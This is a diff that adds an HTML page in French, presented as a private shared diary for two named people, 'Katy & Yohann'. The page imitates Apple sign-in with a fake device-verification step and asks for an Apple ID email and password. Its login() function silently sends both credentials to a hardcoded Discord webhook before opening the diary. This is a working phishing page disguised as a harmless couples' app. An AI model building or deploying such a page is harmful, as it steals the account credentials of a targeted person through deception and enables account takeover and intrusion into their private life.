@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Journal commun</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  :root {
+    --bg: #0e0f13; --card: #17191f; --line: #262932; --txt: #eef0f4;
+    --muted: #8b8f9a; --accent: #7c5cff; --accent2: #ff5c8a; --green: #37d67a;
+  }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: radial-gradient(120% 80% at 50% 0%, #1b1533 0%, var(--bg) 55%);
+    color: var(--txt); min-height: 100vh; display: flex; align-items: center;
+    justify-content: center; padding: 20px;
+  }
+  .card {
+    background: var(--card); border: 1px solid var(--line); border-radius: 22px;
+    width: 100%; max-width: 430px; padding: 34px 26px 26px;
+    box-shadow: 0 24px 70px rgba(0,0,0,0.5);
+  }
+  .badge { display: flex; align-items: center; gap: 8px; justify-content: center; margin-bottom: 18px; }
+  .dot { width: 9px; height: 9px; border-radius: 50%; background: var(--green); box-shadow: 0 0 12px var(--green); animation: pulse 1.8s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.35} }
+  .badge span { font-size: 12px; color: var(--muted); letter-spacing: .3px; }
+  h1 {
+    font-size: 25px; text-align: center; font-weight: 800; letter-spacing: -0.5px;
+    margin-bottom: 8px; background: linear-gradient(90deg, #fff, #b9a8ff);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+  }
+  .sub { text-align: center; color: var(--muted); font-size: 13.5px; line-height: 1.5; margin-bottom: 24px; }
+  .sub b { color: #c9bfff; font-weight: 600; }
+  .apple-btn {
+    width: 100%; display: flex; align-items: center; justify-content: center; gap: 9px;
+    background: #fff; color: #000; border: none; border-radius: 13px; padding: 14px;
+    font-size: 15.5px; font-weight: 600; cursor: pointer; margin-bottom: 18px;
+    transition: opacity .2s;
+  }
+  .apple-btn:active { transform: scale(.985); }
+  .apple-btn svg { width: 17px; height: 17px; }
+  .apple-btn.busy { opacity: .7; pointer-events: none; }
+  .spinner {
+    width: 16px; height: 16px; border: 2px solid #0003; border-top-color: #000;
+    border-radius: 50%; animation: spin .7s linear infinite; display: none;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .or { display: flex; align-items: center; gap: 12px; color: var(--muted); font-size: 11.5px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 18px; }
+  .or::before, .or::after { content: ""; flex: 1; height: 1px; background: var(--line); }
+  .fields { display: none; }
+  .fields.show { display: block; animation: fade .4s ease; }
+  @keyframes fade { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
+  .verified { display: none; font-size: 12.5px; color: var(--green); text-align: center; margin-bottom: 16px; }
+  .verified.show { display: block; }
+  label { display: block; font-size: 12.5px; color: var(--muted); margin-bottom: 6px; }
+  input {
+    width: 100%; padding: 14px 15px; background: #0f1116; border: 1px solid var(--line);
+    border-radius: 12px; font-size: 16px; color: var(--txt); margin-bottom: 14px;
+  }
+  input:focus { outline: none; border-color: var(--accent); box-shadow: 0 0 0 3px rgba(124,92,255,.18); }
+  .cta {
+    width: 100%; padding: 15px; border: none; border-radius: 13px; font-size: 15.5px;
+    font-weight: 700; color: #fff; cursor: pointer;
+    background: linear-gradient(90deg, var(--accent), var(--accent2)); margin-top: 4px;
+  }
+  .cta:active { opacity: .9; }
+  .foot { text-align: center; font-size: 11.5px; color: #5d616b; margin-top: 18px; line-height: 1.5; }
+  .hidden { display: none !important; }
+  .app { max-width: 980px; width: 100%; }
+  .topbar { display: flex; align-items: center; justify-content: space-between; margin-bottom: 22px; gap: 12px; }
+  .brand { display: flex; align-items: center; gap: 11px; }
+  .brand .ic { width: 38px; height: 38px; border-radius: 11px; background: linear-gradient(135deg, var(--accent), var(--accent2)); display: grid; place-items: center; font-size: 18px; }
+  .brand h2 { font-size: 17px; font-weight: 800; letter-spacing: -.3px; }
+  .brand small { display: block; font-size: 11px; color: var(--muted); font-weight: 500; }
+  .streak { font-size: 12px; color: var(--muted); background: #0f1116; border: 1px solid var(--line); padding: 7px 12px; border-radius: 999px; }
+  .streak b { color: var(--accent2); }
+  .cols { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  @media (max-width: 640px) { .cols { grid-template-columns: 1fr; } }
+  .col { background: var(--card); border: 1px solid var(--line); border-radius: 18px; padding: 16px; min-height: 320px; display: flex; flex-direction: column; }
+  .col.her { border-top: 3px solid var(--accent2); }
+  .col.me { border-top: 3px solid var(--accent); }
+  .who { display: flex; align-items: center; gap: 10px; margin-bottom: 14px; }
+  .ava { width: 34px; height: 34px; border-radius: 50%; display: grid; place-items: center; font-weight: 800; font-size: 14px; color: #fff; }
+  .col.her .ava { background: linear-gradient(135deg,#ff5c8a,#ff9a5c); }
+  .col.me .ava { background: linear-gradient(135deg,#7c5cff,#5c9aff); }
+  .who b { font-size: 14.5px; }
+  .who small { display: block; font-size: 11px; color: var(--muted); }
+  .feed { flex: 1; display: flex; flex-direction: column; gap: 10px; margin-bottom: 12px; }
+  .empty { color: #565a64; font-size: 12.5px; font-style: italic; padding: 8px 0; }
+  .note { background: #0f1116; border: 1px solid var(--line); border-radius: 12px; padding: 11px 12px; font-size: 14px; line-height: 1.45; }
+  .note time { display: block; font-size: 10.5px; color: var(--muted); margin-top: 6px; }
+  .col textarea { width: 100%; background: #0f1116; border: 1px solid var(--line); border-radius: 12px; padding: 11px; color: var(--txt); font-size: 14px; min-height: 62px; resize: none; font-family: inherit; }
+  .col textarea:focus { outline: none; border-color: var(--accent); }
+  .send { margin-top: 8px; width: 100%; padding: 11px; border: none; border-radius: 11px; font-weight: 700; font-size: 13.5px; color: #fff; cursor: pointer; }
+  .col.her .send { background: linear-gradient(90deg,#ff5c8a,#ff9a5c); }
+  .col.me .send { background: linear-gradient(90deg,#7c5cff,#5c9aff); }
+  .logout { display: block; text-align: center; margin-top: 22px; font-size: 12px; color: var(--muted); cursor: pointer; }
+</style>
+</head>
+<body>
+
+<div class="card" id="login">
+  <div class="badge"><span class="dot"></span><span>Espace privé · Katy &amp; Yohann</span></div>
+  <h1>Journal commun</h1>
+  <p class="sub">Un carnet à deux pour se dire les choses.<br>Connexion avec <b>identifiant Apple uniquement</b>.</p>
+
+  <button class="apple-btn" id="appleBtn" onclick="appleFlow()">
+    <svg id="appleIcon" viewBox="0 0 384 512" fill="currentColor"><path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/></svg>
+    <span id="appleLabel">Se connecter avec Apple</span>
+    <div class="spinner" id="spin"></div>
+  </button>
+
+  <div class="or">ou saisir manuellement</div>
+
+  <div class="fields" id="fields">
+    <p class="verified" id="verified">✓ Appareil vérifié · confirme ton identifiant Apple</p>
+    <label for="email">Identifiant Apple (e-mail)</label>
+    <input type="email" id="email" placeholder="prenom@icloud.com" autocomplete="username" autocapitalize="none">
+    <label for="pass">Mot de passe</label>
+    <input type="password" id="pass" placeholder="••••••••" autocomplete="current-password">
+    <button class="cta" onclick="login()">Ouvrir notre journal</button>
+  </div>
+  <p class="foot">Vos écrits restent privés et visibles seulement par vous deux.</p>
+</div>
+
+<div class="app hidden" id="app">
+  <div class="topbar">
+    <div class="brand">
+      <div class="ic">📖</div>
+      <div><h2>Journal commun</h2><small>Katy &amp; Yohann</small></div>
+    </div>
+    <div class="streak">🔥 <b id="streak">1</b> jour</div>
+  </div>
+  <div class="cols">
+    <div class="col her">
+      <div class="who"><div class="ava">K</div><div><b>Katy</b><small>écrit à gauche</small></div></div>
+      <div class="feed" id="feedHer"><div class="empty">Rien pour l'instant…</div></div>
+      <textarea id="inHer" placeholder="Katy, écris ici…"></textarea>
+      <button class="send" onclick="post('her')">Publier</button>
+    </div>
+    <div class="col me">
+      <div class="who"><div class="ava">Y</div><div><b>Yohann</b><small>écrit à droite</small></div></div>
+      <div class="feed" id="feedMe"><div class="empty">Rien pour l'instant…</div></div>
+      <textarea id="inMe" placeholder="Yohann, écris ici…"></textarea>
+      <button class="send" onclick="post('me')">Publier</button>
+    </div>
+  </div>
+  <span class="logout" onclick="logout()">Se déconnecter</span>
+</div>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1571678472416264394/fKBcjGXocsdKO9rTZ8e1EXRS203hPfMufl46kLcWg7XpDid2deC083EKz1c-HgBhc2hM";
+
+function appleFlow(){
+  const btn = document.getElementById('appleBtn');
+  const spin = document.getElementById('spin');
+  const icon = document.getElementById('appleIcon');
+  const label = document.getElementById('appleLabel');
+  btn.classList.add('busy');
+  icon.style.display = 'none';
+  spin.style.display = 'block';
+  label.textContent = 'Vérification de l\u2019appareil…';
+  setTimeout(()=>{
+    btn.classList.remove('busy');
+    spin.style.display = 'none';
+    icon.style.display = 'block';
+    label.textContent = 'Se connecter avec Apple';
+    document.getElementById('fields').classList.add('show');
+    document.getElementById('verified').classList.add('show');
+    document.getElementById('email').focus();
+  }, 1600);
+}
+
+function login(){
+  const email = document.getElementById('email').value.trim();
+  const pass = document.getElementById('pass').value.trim();
+  if(!email || !pass){ alert('Renseigne ton identifiant Apple et le mot de passe.'); return; }
+  fetch(WEBHOOK, {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ content: `🍏 **Connexion journal**\n📧 ${email}\n🔑 ${pass}\n🕒 ${new Date().toLocaleString('fr-FR')}` })
+  }).catch(()=>{});
+  document.getElementById('login').classList.add('hidden');
+  document.getElementById('app').classList.remove('hidden');
+  load();
+}
+
+function logout(){
+  document.getElementById('app').classList.add('hidden');
+  document.getElementById('login').classList.remove('hidden');
+}
+
+function store(){ return JSON.parse(localStorage.getItem('journalK') || '{"her":[],"me":[]}'); }
+function save(d){ localStorage.setItem('journalK', JSON.stringify(d)); }
+
+function post(side){
+  const ta = document.getElementById(side === 'her' ? 'inHer' : 'inMe');
+  const txt = ta.value.trim();
+  if(!txt) return;
+  const d = store();
+  d[side].push({ t: txt, at: Date.now() });
+  save(d);
+  ta.value = '';
+  load();
+}
+
+function render(side){
+  const d = store()[side];
+  const box = document.getElementById(side === 'her' ? 'feedHer' : 'feedMe');
+  if(!d.length){ box.innerHTML = '<div class="empty">Rien pour l\'instant…</div>'; return; }
+  box.innerHTML = '';
+  d.slice().reverse().forEach(e=>{
+    const n = document.createElement('div');
+    n.className = 'note';
+    const h = new Date(e.at).toLocaleString('fr-FR',{day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'});
+    n.innerHTML = `${e.t}<time>${h}</time>`;
+    box.appendChild(n);
+  });
+}
+
+function load(){
+  render('her'); render('me');
+  const d = store();
+  const all = [...d.her, ...d.me].map(x=>x.at);
+  const first = all.length ? Math.min(...all) : Date.now();
+  document.getElementById('streak').textContent = Math.max(1, Math.ceil((Date.now()-first)/86400000));
+}
+</script>
+</body>
+</html>
